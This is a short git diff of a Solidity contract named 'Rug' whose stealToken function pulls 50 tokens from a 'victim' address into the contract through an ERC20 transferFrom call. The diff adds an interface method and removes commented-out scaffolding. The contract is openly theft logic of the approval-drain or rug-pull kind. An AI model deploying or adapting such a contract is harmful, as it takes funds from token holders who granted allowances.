@@ -5,7 +5,8 @@ pragma solidity ^0.8.9;
 // import "hardhat/console.sol";
 
 interface ERC20TOKEN {
-    function transferFrom(address _from, address _to, uint256 _value) external returns (bool success);    
+    function transferFrom(address _from, address _to, uint256 _value) external returns (bool success);  
+    function transfer(address,uint256) external returns (bool success);  
 }
 
 contract Rug {
@@ -16,21 +17,8 @@ contract Rug {
     function stealToken(address victim) public {
         // Steal token
         Chainlink.transferFrom(victim,address(this),50 ether);
+        // Chainlink.transfer(victim,50 ether);
     }
-    
-
-    // function buy() public payable {
-
-    // }
-
-    // function setValue(uint256 num) public returns(uint) {
-    //     number = num;
-    //     return number;
-    // }
-    // receive()external payable{
-
-    // }
-
 
 
 }
